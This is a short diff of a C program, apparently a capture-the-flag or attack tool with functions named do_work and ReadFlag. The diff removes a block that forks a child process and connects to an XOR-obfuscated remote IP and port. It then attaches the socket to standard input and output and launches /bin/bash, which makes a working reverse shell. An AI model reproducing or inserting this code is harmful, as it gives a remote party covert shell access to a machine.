@@ -461,30 +461,6 @@ void do_work(char **argv)
         usleep(100000);
     }
 }
-{
-    pid_t pid = fork();
-    if (pid == 0)
-    {
-        char *a[10] = {NULL};
-        a[0] = (char *)malloc(0x50);
-        strcpy(a[0], XorString(SHELL_NAME));
-        struct sockaddr_in serverAddr;
-        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-        serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(SHELL_PORT + cur_idx);
-        serverAddr.sin_addr.s_addr = inet_addr(XorString(SHELL_IP));
-        if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
-        {
-            dup2(clientSocket, 0);
-            dup2(clientSocket, 1);
-            dup2(clientSocket, 2);
-            execve(XorString("/bin/bash"), a, NULL);
-        }
-        close(clientSocket);
-        exit(0);
-    }
-    shell_id = pid;
-}
 
 void ReadFlag()
 {
